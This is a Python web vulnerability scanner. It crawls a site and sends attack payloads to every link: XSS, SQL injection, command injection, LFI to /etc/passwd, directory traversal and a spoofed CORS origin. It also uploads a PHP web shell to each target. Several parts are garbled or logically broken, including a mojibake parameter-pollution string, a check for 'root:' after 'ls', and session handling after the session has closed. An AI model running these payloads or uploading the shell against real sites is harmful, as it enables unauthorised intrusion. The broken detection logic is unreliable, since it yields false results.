import requests
from bs4 import BeautifulSoup
import sys
import urllib.parse
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.action_chains import ActionChains
from sslyze import (
    ServerConnectivityTester,
    ServerNetworkLocationViaDirectConnection,
    Scanner,
)
from sslyze.plugins.openssl_cipher_suites_plugin import Tlsv10ScanCommand
import threading
from concurrent.futures import ThreadPoolExecutor
import time

# Add the following for command line argument parsing and validation
import argparse
from urllib.parse import urlparse, urlunparse

# Set up Selenium
webdriver_service = Service('./chromedriver')  # Path to your chromedriver
chrome_options = Options()
chrome_options.add_argument("--headless")  # Ensure GUI is off
chrome_options.add_argument("--no-sandbox")
chrome_options.add_argument("--disable-dev-shm-usage")

# Constant for request timeout
REQUEST_TIMEOUT = 5

# SSL/TLS vulnerabilities


def test_ssl_tls_vulnerabilities(url):
    """
    This function checks the given URL for SSL/TLS vulnerabilities.
    """
    try:
        # Define the server that you want to scan
        server_location = ServerNetworkLocationViaDirectConnection.with_ip_address_lookup(
            url, 443)

        # Do connectivity testing to ensure SSLyze is able to connect
        server_info = ServerConnectivityTester().perform(server_location)

        # Then queue some scan commands for the server
        scanner = Scanner()
        scanner.queue_scan_command(server_info, Tlsv10ScanCommand())

        # Call the method below to do the scanning and print the results
        for server_scan_result in scanner.get_results():
            print(f"\n[+] Testing SSL/TLS vulnerabilities on: {url}")
            print(server_scan_result)

    except Exception as e:
        print(
            f"[!] An error occurred while testing SSL/TLS vulnerabilities on: {url}\n{str(e)}")


# Misconfigured security headers
def test_misconfigured_security_headers(url):
    """
    This function checks the given URL for misconfigured security headers.
    """
    try:
        headers = requests.get(url, timeout=REQUEST_TIMEOUT).headers

        # Content Security Policy
        if 'Content-Security-Policy' not in headers:
            print(
                f"[+] The Content-Security-Policy header is missing in URL: {url}")

        # HTTP Strict Transport Security
        if 'Strict-Transport-Security' not in headers:
            print(
                f"[+] The Strict-Transport-Security header is missing in URL: {url}")

        # X-Content-Type-Options
        if 'X-Content-Type-Options' not in headers or headers['X-Content-Type-Options'] != 'nosniff':
            print(
                f"[+] The X-Content-Type-Options header is not set correctly in URL: {url}")

    except Exception as e:
        print(
            f"[!] An error occurred while testing misconfigured security headers on: {url}\n{str(e)}")


# Vulnerability Test functions
def test_xss_in_url(url):
    """
    This function checks the given URL for cross site scripting (XSS) vulnerabilities.
    """
    try:
        xss_test_script = "<Script>alert('XSS')</scripT>"
        url = url.replace("FUZZ", xss_test_script)
        response = requests.get(url, timeout=REQUEST_TIMEOUT)

        if xss_test_script in response.text:
            print("[+] Discovered XSS in url: " + url)

    except Exception as e:
        print(
            f"[!] An error occurred while testing for XSS in URL: {url}\n{str(e)}")


def test_sql_injection(url):
    """
    This function checks the given URL for SQL injection vulnerabilities.
    """
    try:
        sql_test_script = "' OR '1'='1"
        url = url.replace("FUZZ", sql_test_script)
        response = requests.get(url, timeout=REQUEST_TIMEOUT)

        if "error in your SQL syntax" in response.text:
            print("[+] Discovered SQL injection in url: " + url)

    except Exception as e:
        print(
            f"[!] An error occurred while testing for SQL injection in URL: {url}\n{str(e)}")


def test_command_injection(url):
    """
    This function checks the given URL for command injection vulnerabilities.
    """
    try:
        command_injection_test_script = "; ls"
        url = url.replace("FUZZ", command_injection_test_script)
        response = requests.get(url)

        if "root:" in response.text:
            print("[+] Discovered Command injection in url: " + url)

    except Exception as e:
        print(
            f"[!] An error occurred while testing for command injection in URL: {url}\n{str(e)}")


def test_lfi(url):
    """
    This function checks the given URL for Local File Inclusion (LFI) vulnerabilities.
    """
    try:
        lfi_test_script = "../../../../etc/passwd"
        url = url.replace("FUZZ", lfi_test_script)
        response = requests.get(url)

        if "root:x:0:0:root:/root:/bin/bash" in response.text:
            print("[+] Discovered LFI in url: " + url)

    except Exception as e:
        print(
            f"[!] An error occurred while testing for LFI in URL: {url}\n{str(e)}")


def test_http_verb_tampering(url):
    """
    This function checks the given URL for HTTP verb tampering vulnerabilities.
    """
    try:
        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']
        responses = {}

        for method in methods:
            try:
                response = requests.request(method, url)
                responses[method] = (response.status_code, response.text)
            except requests.exceptions.RequestException:
                print(
                    f"[!] An error occurred while sending {method} request to the URL: {url}")
                responses[method] = None

        if len(set(responses.values())) != 1:
            print(
                f"[+] The server's responses for different HTTP methods are not all the same. Possible HTTP verb tampering vulnerability in URL: {url}")

    except Exception as e:
        print(
            f"[!] An error occurred while testing for HTTP verb tampering in URL: {url}\n{str(e)}")


def test_file_upload_vulnerability(url):
    """
    This function checks the given URL for file upload vulnerabilities.
    """
    try:
        dangerous_file_content = '<?php echo shell_exec($_GET["cmd"]); ?>'
        with open('dangerous_file.php', 'w') as f:
            f.write(dangerous_file_content)

        files = {'uploaded_file': open('dangerous_file.php', 'rb')}
        try:
            response = requests.post(url, files=files)
        except requests.exceptions.RequestException:
            print(
                f"[!] An error occurred while trying to upload a file to the URL: {url}")
            return

        if response.status_code == 200:
            print(
                f"[+] File uploaded successfully, possible file upload vulnerability in URL: {url}")

    except Exception as e:
        print(
            f"[!] An error occurred while testing for file upload vulnerability in URL: {url}\n{str(e)}")


def test_session_fixation(url, username, password):
    """
    This function checks the given URL for session fixation vulnerabilities.
    """
    try:
        login_data = {
            'username': username,
            'password': password,
        }

        # Log in and get session cookie (PHPSESSID in this case)
        with requests.Session() as s:
            response = s.post(url, data=login_data)
            if 'PHPSESSID' not in s.cookies:
                print(
                    "[!] PHPSESSID not found, maybe a different session management is used.")
                return
            session_cookie_before = s.cookies['PHPSESSID']

        # Log out
        s.get(url + '?action=logout')

        # Log in again
        response = s.post(url, data=login_data)
        session_cookie_after = s.cookies['PHPSESSID']

        # Check if session cookie has changed
        if session_cookie_before == session_cookie_after:
            print(
                f"[+] Session cookie didn't change after login. Possible session fixation vulnerability in URL: {url}")

    except Exception as e:
        print(
            f"[!] An error occurred while testing for session fixation in URL: {url}\n{str(e)}")


# HTTP Parameter Pollution Test function
def test_http_parameter_pollution(url):
    try:
        hpp_test_script = "?param=value1Â¶m=value2"
        url = url + hpp_test_script
        response = requests.get(url)

        if "value1,value2" in response.text:
            print("[+] Discovered HTTP Parameter Pollution in url: " + url)
    except Exception as e:
        print(
            f"[!] An error occurred while testing for HTTP Parameter Pollution in URL: {url}\n{str(e)}")

# Insecure Direct Object References (IDOR) Test function


def test_idor(url):
    try:
        # IDOR test is more of an informed guesswork.
        # Here we are replacing every digit in the url hoping it might be an object reference (like id=1)
        original_response = requests.get(url).text
        for i in range(10):
            modified_url = url
            for ch in "0123456789":
                modified_url = modified_url.replace(ch, str(i))

            modified_response = requests.get(modified_url).text
            if original_response != modified_response:
                print(
                    f"[+] Response changed when modifying digits in URL, potential IDOR vulnerability: {url}")
                break
    except Exception as e:
        print(
            f"[!] An error occurred while testing for IDOR in URL: {url}\n{str(e)}")

# Directory Traversal Test function


def test_directory_traversal(url):
    try:
        traversal_payloads = ["../", "..%2f", "..%5c", "..%255c"]

        for payload in traversal_payloads:
            mod_url = url.replace("FUZZ", payload)
            response = requests.get(mod_url)

            if response.status_code == 200:
                print(f"[+] Directory traversal possible in URL: {url}")
    except Exception as e:
        print(
            f"[!] An error occurred while testing for Directory Traversal in URL: {url}\n{str(e)}")

# CORS Misconfiguration Test function


def test_cors_misconfiguration(url):
    try:
        headers = {
            "Origin": "http://malicious.com",
            "Access-Control-Request-Method": "GET"
        }
        response = requests.options(url, headers=headers)

        if "Access-Control-Allow-Origin" in response.headers and response.headers["Access-Control-Allow-Origin"] == "*":
            print(f"[+] Potential CORS misconfiguration in URL: {url}")
    except Exception as e:
        print(
            f"[!] An error occurred while testing for CORS misconfiguration in URL: {url}\n{str(e)}")

# Function to Extract all links from a URL


def extract_links_from(url):
    try:
        # Initiate the browser
        driver = webdriver.Chrome(
            service=webdriver_service, options=chrome_options)
        driver.get(url)

        # Use Selenium's inbuilt function to gather all 'a' tags in the HTML
        elements = driver.find_elements(By.TAG_NAME, 'a')

        links = [element.get_attribute('href') for element in elements]

        return links
    finally:
        # Ensure to quit the webdriver in any case
        driver.quit()

# Function to Test each link


def test_link(link, username, password):
    try:
        if "=" in link:
            print("\n[+] Testing " + link)
            test_sql_injection(link)
            test_xss_in_url(link)
            test_command_injection(link)
            test_lfi(link)
            test_http_verb_tampering(link)
            test_file_upload_vulnerability(link)
            test_session_fixation(link, username, password)
            test_http_parameter_pollution(link)
            test_idor(link)
            test_directory_traversal(link)
            test_cors_misconfiguration(link)
            test_misconfigured_security_headers(link)
            test_ssl_tls_vulnerabilities(link)
    except Exception as e:
        print(f"[!] An error occurred while testing link: {link}\n{str(e)}")

# Modified main function


def main(url, username, password):
    try:
        print("[+] Discovering links from: " + url)
        links = extract_links_from(url)

        # Use a thread pool with a max number of concurrent threads (20 in this case)
        with ThreadPoolExecutor(max_workers=20) as executor:
            # Submit a new task for each link
            for link in links:
                sanitized_link = urllib.parse.quote_plus(
                    link, safe='/:')  # sanitize input
                executor.submit(test_link, sanitized_link, username, password)
    except Exception as e:
        print(f"[!] An error occurred in main function\n{str(e)}")


# Entry point
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Website vulnerability scanner')
    parser.add_argument('url', help='The URL of the website to scan')
    parser.add_argument('username', help='Username for the website')
    parser.add_argument('password', help='Password for the website')

    args = parser.parse_args()

    url_parsed = urlparse(args.url)

    # check if the URL is valid
    if not all([url_parsed.scheme, url_parsed.netloc]):
        print("The URL provided is not valid")
        sys.exit(1)

    main(args.url, args.username, args.password)
